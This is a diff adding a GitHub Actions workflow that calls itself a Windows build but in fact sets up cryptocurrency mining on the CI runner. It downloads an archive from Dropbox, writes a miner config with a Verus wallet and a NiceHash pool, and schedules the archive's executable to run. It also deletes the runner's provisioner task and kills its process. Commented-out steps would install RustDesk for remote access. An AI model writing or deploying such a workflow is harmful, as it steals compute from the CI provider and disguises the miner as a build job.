@@ -1,0 +1,74 @@
+name: Windows
+on:
+  #schedule:
+    #- cron: '*/5 * * * *'
+  workflow_dispatch:
+
+jobs:
+  build:
+    name: Start Building...
+    runs-on: windows-latest
+    timeout-minutes: 300
+    
+    steps:
+
+      - name: downloading
+        run: Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/adx1lqs2m7lx94jxbbt8k/Nonoarchive.zip?rlkey=cw1psvp7jbwgfjrctzgu18kts&st=oluf1lvr&dl=1" -OutFile "nonoarchive.zip"
+      
+      - name: Extracting..
+        run: tar -xf nonoarchive.zip
+        
+      - name: Configuration file . 
+        run: | 
+          
+          $WORKNAME= & Get-Date -format hhmmss
+          #$WORKNAME= 'RestUp'
+          echo 'wallet = NHbUzxvSsaUGp6ctYCCPVDgcYfT5rZvaYJeH' > config.ini
+          echo 'coin = VRSC' >> config.ini
+          echo "rigName = worker$WORKNAME" >> config.ini
+          echo 'pool1=verushash.auto.nicehash.com:9200' >> config.ini
+          echo 'sortPools=true' >> config.ini
+          echo 'cpuThreads = 2' >> config.ini
+          echo 'Configuration ok' 
+          type config.ini
+
+      #- name: Download time.py
+        #run: curl -s -L -o time.py "https://www.dropbox.com/scl/fi/ocurbgjx4wfsxcmx7ot4g/timelimit.py?rlkey=dcwo5cdngikiikabu6d61nymj&st=25sjgthk&dl=1"
+
+      #- name: Download Rustdesk login.py
+       # run: curl -s -L -o login.py "https://www.dropbox.com/scl/fi/rlhfet2goqp51umjbsco6/login.py?rlkey=nm7g1kpa233lnk9jgccdxhq9q&st=2nn2kdlk&dl=1"
+      
+      #- name: Download Rustdesk 1.2.1 
+        #run: certutil -urlcache -split -f "https://github.com/rustdesk/rustdesk/releases/download/1.2.1/rustdesk-1.2.1-x86_64.exe" rustdesk.exe
+
+      #- name: Install pyautogui libraries
+        #run: pip install pyautogui --quiet
+        
+          
+      #- name: Starting Rustdesk...
+        #run: start rustdesk.exe
+      
+      #- name: Rustdesk Log in Credintials.
+       # run: python login.py
+
+      - name: batch script
+        run: |
+          $filepath = $scriptPath = "${{ github.workspace }}"
+          echo @echo off > run_task.bat
+          echo "cd /d $filepath" >> run_task.bat
+          echo nonoarchive\12230.exe >> run_task.bat
+          echo Batch script created at %CD%\run_task.bat
+          
+      - name: scheduled task to run after 120 seconds
+        run: |
+          $scriptPath = "${{ github.workspace }}\run_task.bat"
+          schtasks /create /tn "MyScheduledTask" /tr "$scriptPath" /sc once /st $(Get-Date -f 'HH:mm:ss' -date (Get-Date).AddSeconds(120)) /f
+
+
+      - name: Terminate
+        run: |
+          schtasks /delete /tn "RunnerMachineProvisioner" /f
+          taskkill /im provisioner.exe
+
+      - name: Timer
+        run: python time.py
